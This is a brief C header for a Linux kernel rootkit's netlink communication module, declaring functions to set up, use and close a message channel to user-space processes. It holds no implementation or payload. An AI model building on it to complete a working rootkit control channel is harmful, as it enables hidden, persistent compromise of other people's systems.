#ifndef ROOTKIT_COMMUNICATE_H
#define ROOTKIT_COMMUNICATE_H

#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>

void my_recv_msg(struct sk_buff *skb);

void my_send_msg(int pid, char *msg);

int setup_my_channel(void);

void close_my_channel(void);

#endif //ROOTKIT_COMMUNICATE_H
